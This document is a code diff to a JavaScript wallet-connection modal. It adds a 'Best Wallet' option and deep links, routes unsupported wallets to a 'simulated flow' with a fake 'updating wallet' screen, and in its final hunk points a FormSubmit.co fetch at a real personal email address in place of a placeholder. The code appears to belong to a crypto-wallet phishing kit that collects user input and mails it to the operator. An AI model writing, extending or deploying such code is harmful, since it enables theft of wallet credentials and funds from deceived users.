@@ -108,6 +108,7 @@ class WalletModal {
       { id: 'zerion', name: 'Zerion', emoji: '⚡' },
       { id: 'atomic', name: 'Atomic Wallet', emoji: '⚛️' },
       { id: 'safepal', name: 'SafePal', emoji: '💎' },
+      { id: 'bestwallet', name: 'Best Wallet', emoji: '🏆' },
       { id: 'crypto', name: 'Crypto.com', emoji: '💳' },
       { id: 'binance', name: 'Binance Wallet', emoji: '🔶' },
       { id: 'cardano', name: 'Cardano', emoji: '🔵' },
@@ -297,7 +298,7 @@ class WalletModal {
     const walletBrowsers = [
       'Trust', 'TokenPocket', 'SafePal', 'MetaMask', 'Coinbase',
       'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare', 'Bitget',
-      'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo'
+      'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo', 'BestWallet'
     ];
     
     for (const wallet of walletBrowsers) {
@@ -564,7 +565,7 @@ class WalletModal {
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     
     if (isMobile) {
-      // Only these main wallets have verified working deep links
+      // Only these wallets have verified working deep links
       const workingDeepLinks = {
         'metamask': true,
         'trust': true,
@@ -573,14 +574,15 @@ class WalletModal {
         'okx': true,
         'phantom': true,
         'solflare': true,
-        'bitget': true
+        'bitget': true,
+        'bestwallet': true
       };
       
-      // If it's a main wallet with working deep link, try to open it
+      // If wallet has working deep link, try to open it
       if (workingDeepLinks[this.selectedWallet.id]) {
         this.openWalletApp();
       } else {
-        // For all WalletConnect sub-wallets and others, show simulated flow
+        // For all other wallets, show simulated flow
         setTimeout(() => {
           this.showUpdatingWallet();
         }, 300);
@@ -609,14 +611,7 @@ class WalletModal {
       'solflare': `https://solflare.com/ul/v1/browse/${websiteUrl}`,
       'walletconnect': websiteUrl,
       'bitget': `https://bkcode.vip?action=dapp&url=${encodeURIComponent(websiteUrl)}`,
-      // WalletConnect sub-wallets with verified support
-      'zerion': `https://wallet.zerion.io/connect?uri=${encodeURIComponent(websiteUrl)}`,
-      'atomic': `https://atomicwallet.io/open?url=${encodeURIComponent(websiteUrl)}`,
-      'safepal': `https://link.safepal.io/open?url=${encodeURIComponent(websiteUrl)}`,
-      'crypto': `https://crypto.com/defi-wallet/open?url=${encodeURIComponent(websiteUrl)}`,
-      'token': `tpoutside://pull.activity?param=${encodeURIComponent(websiteUrl)}`,
-      'onto': `onto://pull.activity?param=${encodeURIComponent(websiteUrl)}`,
-      'exodus': `https://exodus.com/m/dapp?url=${encodeURIComponent(websiteUrl)}`
+      'bestwallet': `https://link.bestwallet.com/dapp?url=${encodeURIComponent(websiteUrl)}`
     };
 
     const link = deepLinks[this.selectedWallet.id];
@@ -928,7 +923,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
+    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
